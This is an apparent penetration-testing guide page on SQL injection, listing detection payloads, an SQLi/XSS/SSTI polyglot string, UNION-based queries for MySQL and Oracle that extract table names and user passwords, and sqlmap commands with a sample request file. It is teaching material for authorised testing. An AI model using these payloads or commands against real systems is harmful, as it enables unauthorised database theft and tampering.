# SQL injection

## Theory

Many web applications use one or multiple databases to manage data. In order to dynamically edit the database while users browse the website, some SQL queries can rely on input vectors. When input parameters used in those queries are insufficiently validated or sanitized, these web apps can be vulnerable to SQL injections.

SQL injection attacks can allow attackers to read, update, insert or delete database data by injecting a piece of SQL query through the input vector, hence affecting the intended execution of the original query. In some cases, these attacks can also lead to File Download, File Upload or even Remote Code Execution.

## Practice

Testers need to identify input vectors (parts of the app that accept content from the users) that could be used for database operations. For each identified vector, testers need to check if malicious strings and values successfully exploit any vulnerability.

### Vulnerable input recon

Using special SQL characters (`'`, `"`, `#`, `;`, `)`, `*`,`%`) in an input could lead to SQL errors sometimes echoed back to the users for debugging. This would indicate an entry point not sanitized enough and thus potentially vulnerable to SQL injection.

{% hint style="info" %}
For every payload do not forget to try url encoding or others.
{% endhint %}

### Manual testing

With `some.website/?parameter=value` some basic useful payload to detect vulnerable inputs are:

```
parameter=1
parameter=1'
parameter=1"
parameter=[1]
parameter[]=1
parameter=1`
parameter=1\
parameter=1/**/
parameter=1/*!111'*/
parameter=1' or '1'='1
parameter=1 or 1=1
parameter=' or ''='
parameter=' OR 1 -- -
parameter=1' or 1=1 --
parameter=1' or 1=1 -- -
parameter=1' or 1=1 /*
parameter='='
```

{% hint style="warning" %}
GET parameters are not the only ones that could be vulnerable to SQLi. Testers should thoroughly test all user inputs (parameters, user-agents, cookies...)
{% endhint %}

The following payload is used for testing SQL injections, [XSS (Cross-Site Scripting)](xss.md) and [SSTI (Server-Side Template Injection)](../../web-services/attacks-on-inputs/ssti-server-side-tempate-injection.md).

```
'"<svg/onload=prompt(5);>{{7*7}}
```

#### Extracting information with UNION

{% tabs %}
{% tab title="MySQL" %}
1\. Finding number of columns:

```sql
' ORDER BY 2 -- # iterate until error to find number of columns
```

2\. Extract database information:

```sql
' UNION SELECT @@version, NULL -- # Inserting null depending on number of columns
```

3\. Find tables name:

```sql
' UNION SELECT NULL,concat(COLUMN_NAME) from information_schema.columns where table_name='users' --
```

4\. Retrieve information from table:

```sql
' UNION SELECT username,password from users --
```
{% endtab %}

{% tab title="Oracle" %}
1\. Finding number of columns:

```sql
' ORDER BY 2 -- # iterate until error to find number of columns
```

2\. Extract database information:

```sql
' UNION SELECT banner,NULL from v$version --
```

3\. Find tables name:

```sql
' UNION SELECT table_name,NULL from all_tables --
```

4\. Retrieve information from table:

```sql
' UNION SELECT username,password from users --
```
{% endtab %}
{% endtabs %}

### Automated tests

Tools like [SQLmap](https://github.com/sqlmapproject/sqlmap) (Python) or [SQLninja](https://github.com/xxgrunge/sqlninja) (Perl) can also be used to fuzz input vectors, find vulnerable entry points and automatically exploit them.

{% hint style="danger" %}
Just like any fuzzing tool, these scans need to be slowed down when testing production instances as it could lead to an unintended denial of service. In addition to that, testers need to use those tools with the greatest care since creating issues with production instances databases (like overwriting or deleting data) could have a serious fallout.
{% endhint %}

```bash
sqlmap --user-agent "PENTEST" --url $URL -p target_parameter --all
```

It is also possible to load request files and let SQLmap do the heavy work of fuzzing every parameter and input vector.

```bash
sqlmap -r $REQUEST_FILE --level 2 -v 2 --all
```

The request file should look like a standard HTTP request (line, headers, empty line, optional data). It can be obtained by many ways like inspecting network operations in a browser, intercepting requests with a proxy (like Burp Suite), and so on.

```http
POST /login.php HTTP/1.1
Host: www.target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,fr;q=0.5,fr-FR;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Cookie: JSESSIONID=F168EA13C46D14AA134E13D4;
Connection: keep-alive
Upgrade-Insecure-Requests: 1

username=testusername&password=testpassword
```

## References

{% embed url="https://www.asafety.fr/mysql-injection-cheat-sheet/" %}

{% embed url="https://owasp.org/www-community/attacks/SQL_Injection" %}

{% embed url="https://portswigger.net/web-security/sql-injection" %}

{% embed url="http://pentestmonkey.net/category/cheat-sheet/sql-injection" %}
SQL injection cheatsheets (MSSQL, MySQL, Oracle SQL, Postgres SQL, ...)
{% endembed %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" %}

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

{% embed url="https://github.com/Hakumarachi/Loose-Compare-Tables" %}
